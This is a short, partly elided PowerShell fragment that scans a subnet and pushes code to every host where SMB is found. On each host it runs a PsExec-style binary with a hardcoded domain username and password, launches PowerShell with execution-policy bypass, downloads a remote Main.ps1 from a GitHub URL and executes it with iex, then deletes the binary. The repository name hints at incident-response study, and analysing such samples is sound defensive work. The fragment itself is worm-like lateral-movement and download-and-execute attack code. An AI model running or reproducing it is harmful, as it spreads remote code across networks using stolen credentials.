...
foreach ($ip in $ipAddresses) {
    ...
    for ($counter = 1; ($octets[3] - $counter) -ge 1; $counter++) {
        ...
        if ($smb) {
            ...
            .\test.exe \\$targetIP -u duck\gilcol -p P@ssw0rd -d -accepteula powershell -nop -ep Bypass -c "hostname;iex (iwr https://raw.githubusercontent.com/michelangelosplinter/D.F.I.R-Public-Resources/refs/heads/main/aspnet/Main.ps1 -UseBasicParsing).Content;exit"
            del test.exe
    	}
    }
